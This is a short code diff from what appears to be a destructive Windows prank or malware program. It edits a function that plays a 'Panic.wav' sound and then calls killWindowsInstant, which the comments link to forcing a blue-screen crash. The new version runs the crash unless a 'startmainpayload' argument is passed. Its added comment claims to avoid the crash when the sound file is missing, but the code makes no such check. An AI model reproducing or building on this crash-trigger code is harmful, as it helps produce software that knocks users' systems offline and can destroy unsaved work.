@@ -1096,12 +1096,12 @@ void NormalComputer() {
     );
 }
 
-int PlayMusik() {
-    if (PlaySoundA("C:\\Program Files\\Common Files\\system\\Panic.wav", NULL, SND_SYNC) == FALSE) { // If it does not find the file (returns False) if BSOD =)
-        killWindowsInstant();
-    }
+int PlayMusik() { // Add argument check for avoid kWI function if not found panic.wav
+    int argc;
+    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);    
+    PlaySoundA("C:\\Program Files\\Common Files\\system\\Panic.wav", NULL, SND_SYNC);
     // plays music
-    killWindowsInstant();
+    if (not(argc > 1 && !lstrcmpW(argv[1], L"startmainpayload"))) killWindowsInstant();
     return 0;
 }
 
